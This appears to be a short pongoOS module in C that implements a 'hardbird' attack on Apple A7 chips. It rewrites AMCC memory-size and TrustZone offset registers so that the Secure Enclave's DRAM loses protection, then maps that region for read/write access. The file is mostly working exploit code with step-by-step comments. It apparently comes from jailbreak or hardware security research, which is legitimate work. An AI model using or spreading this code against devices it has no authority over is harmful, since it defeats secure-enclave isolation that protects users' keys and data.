#include "pongo.h"

static int hardbird_attack(const char* cmd, char* args) {
    if (socnum == 0x8960) { // A7
        printf("[*] gIOBase: 0x%llx\n", gIOBase);
        volatile uint32_t* memsize_reg = (volatile uint32_t*)(gIOBase + 0x81C);
        volatile uint32_t* tzRegs = (volatile uint32_t*)(gIOBase + 0x900);
        
        uint32_t memsize_orig = *memsize_reg;
        uint32_t tz0_orig = tzRegs[2];
        uint32_t tz1_orig = tzRegs[3];

        //
        // The AMCC bug
        //

        // Tell SEP that the device has 16GB of DRAM so that it thinks the memory map is bigger than reality
        // That lets us deal with bigger offsets without SEP rejecting them as invalid
        *memsize_reg = 0x7F;

        // Set the TZ0 offset to a 16MB range (0x100000000 to 0x101000000)
        tzRegs[2] = 0x100F1000; 

        // Same 16MB range with the TZ1 offset (0x101100000 to 0x101300000)
        tzRegs[3] = 0x10121011;

        printf("[*] memsize_reg: 0x%x -> 0x%x\n", memsize_orig, *memsize_reg);
        printf("[*] tz0_reg: 0x%x -> 0x%x\n", tz0_orig, tzRegs[2]);
        printf("[*] tz1_reg: 0x%x -> 0x%x\n", tz1_orig, tzRegs[3]);

        // AMCC will now protect 0x800000000 + our TZ0/TZ1 offset range of 16MB
        // So AMCC now protects 0x900000000 to 0x901000000
        // SEP is using 0x800000000 to 0x801000000, which is now unprotected by AMCC so we can r/w to it
        // Now just lock TZ registers, send BootTZ0, map the now unprotected SEP DRAM range and we should have TZ r/w

        __asm__ volatile("dmb sy");
        tz_lockdown();
        seprom_boot_tz0();

        map_range(0x800000000ULL, 0x800000000ULL, 0x010000000ULL, 0, 0, true);
        printf("[*] Mapped range from 0x800000000 to 0x801000000\n");
        hexdump((void*)0x800000000, 0x40);
        printf("[*] Got TZ r/w successfully, all done\n");
    } else {
        printf("[!] Not supported on this SoC\n");
        return -1;
    }

    return 0;
}

void module_entry(void) {
    printf("[*] Loaded hardbird_attack module\n");
    command_register("hardbird_attack", "performs SEPROM hardbird attack on A7 SoCs", (void*)hardbird_attack);
}
